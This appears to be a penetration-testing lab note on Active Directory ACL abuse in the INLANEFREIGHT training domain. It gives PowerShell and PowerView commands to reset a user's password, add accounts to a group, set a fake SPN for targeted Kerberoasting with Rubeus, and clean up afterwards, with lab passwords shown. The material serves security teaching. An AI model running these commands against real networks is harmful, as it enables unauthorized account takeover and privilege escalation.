# ACL Abuse Tactics

1. First we use `wley` user to change the password for the `damundsen` use
2. Authenticate as the `damundsen` user and leverage `GenericWrite` rights to add a user that we control to the `Help Desk Level 1` group
3. Take advantage of nested group membership in the `Information Technology` group and leverage `GenericAll` rights to take control of the `adunn` user

*   **Authenticate with valid user - Creating a PSCredential Object**

    to tell PowerShell we will work with wley privilege

    ```powershell
    $SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
    ```

    then create a  SecureString object which represents the new password for user
*   **Creating a SecureString Object**

    ```powershell
    $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
    ```
*   **changing the user’s password**

    ```powershell
    Import-Module .\PowerView.ps1
    Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

    # damundsenPassword  -> new password object
    # Cred -> wley credintial
    ```

    ![image.png](<../../../../.gitbook/assets/image (45).png>)
*   **Creating a SecureString Object using exploited user**

    ```powershell
    $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
    $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
    ```
*   **check a member in this group**

    which will display all members in this group

    ```powershell
    Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
    ```

    <figure><img src="../../../../.gitbook/assets/image 1 (25).png" alt=""><figcaption></figcaption></figure>
*   **Add member to this group**

    ```powershell
    Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
    # Cred2 -> damundsen credintial - secure object
    ```

    <figure><img src="../../../../.gitbook/assets/image 2 (14).png" alt=""><figcaption></figcaption></figure>
*   **Confirming user was Added to the Group**

    ```powershell
    Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
    ```

say that our client permitted us to change the password of the `damundsen` user, but the `adunn` user is an admin account that cannot be interrupted.

We can perform a targeted Kerberoasting attack

{% hint style="danger" %}
this attack will be success when you have privilege **`GenericWrite`, `GenericAll`** **`WriteProperty or WriteSPN or WritePWD` , `WriteOwner` , `WriteDACL`**
{% endhint %}

***

*   **Creating a Fake SPN**

    ```powershell
    Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
    ```

    <figure><img src="../../../../.gitbook/assets/image 5 (6).png" alt=""><figcaption></figcaption></figure>
*   **Kerberoasting with Rubeus**

    ```powershell
    .\Rubeus.exe kerberoast /user:adunn /nowrap
    ```

    <figure><img src="../../../../.gitbook/assets/image 4 (8).png" alt=""><figcaption></figcaption></figure>

***

### **Cleanup**

*   **Removing the Fake SPN from adunn's Account**

    ```powershell
    Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
    ```
*   **Removing damundsen from the Help Desk Level 1 Group**

    ```powershell
    Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
    ```
*   **Confirming damundsen was Removed from the Group**

    ```powershell
    Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
    ```
